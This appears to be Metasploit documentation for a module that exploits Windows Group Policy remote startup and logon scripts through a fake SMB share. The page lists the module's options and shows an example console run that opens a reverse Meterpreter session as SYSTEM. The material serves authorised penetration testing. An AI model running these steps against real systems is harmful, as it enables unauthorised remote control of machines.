## Vulnerable Application

This is a general-purpose module for exploiting systems with Windows Group Policy configured to load VBS startup/logon scripts from remote locations. This module runs a SMB shared resource that will provide a payload through a VBS file. Startup scripts will be executed with SYSTEM privileges, while logon scripts will be executed with the user privileges. The attacker still needs to redirect the target traffic to the fake SMB share to exploit it successfully. Please note in some cases, it will take 5 to 10 minutes to receive a session.

More information available at [Gotham Digital Science Security](https://blog.gdssecurity.com/labs/2015/1/26/badsamba-exploiting-windows-startup-scripts-using-a-maliciou.html)

## Verification Steps

2. Start msfconsole
3. Do: `use modules/exploits/windows/smb/group_policy_startup`
4. Do: `exploit`

## Options

```
set FILE_NAME [string]
```
VBS File name to share (Default: random .vbs)

```
set FOLDER_NAME [string]
```
Folder name to share (Default: none)

```
set SHARE [string]
```
Share (Default: Random)

```
set SRVHOST [integer]
```
The local host to listen on. This must be an address on the local machine or 0.0.0.0

```
set SRVPORT [integer]
```
The local port to listen on.

## Scenarios

A run on Windows 7 (x64, Build 7601, SP1) and Server 2016 (x64, Version 1607, OS Build 14393.970) using Group Policy applied from the Domain Controller.

  ```
  msf > use modules/exploits/windows/smb/group_policy_startup
  msf exploit(windows/smb/group_policy_startup) > set FILE_NAME startup.vbs
    FILE_NAME => startup.vbs
  msf exploit(windows/smb/group_policy_startup) > set SHARE scripts
    SHARE => scripts
  msf exploit(windows/smb/group_policy_startup) > exploit
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.

    [*] Started reverse TCP handler on 192.168.1.3:4444
    [*] File available on \\192.168.1.3\scripts\startup.vbs...
    [*] Started service listener on 192.168.1.3:445
    [*] Server started.
    [*] Sending stage (180291 bytes) to 192.168.1.4
    [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.4:49178) at 2019-12-04 13:12:05 -0700
  msf exploit(windows/smb/group_policy_startup) > sessions 1
    [*] Starting interaction with 1...

    meterpreter > sysinfo
    Computer        : MSF-PC
    OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
    Architecture    : x64
    System Language : en_US
    Domain          : MSF
    Logged On Users : 1
    Meterpreter     : x86/windows
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
  ```
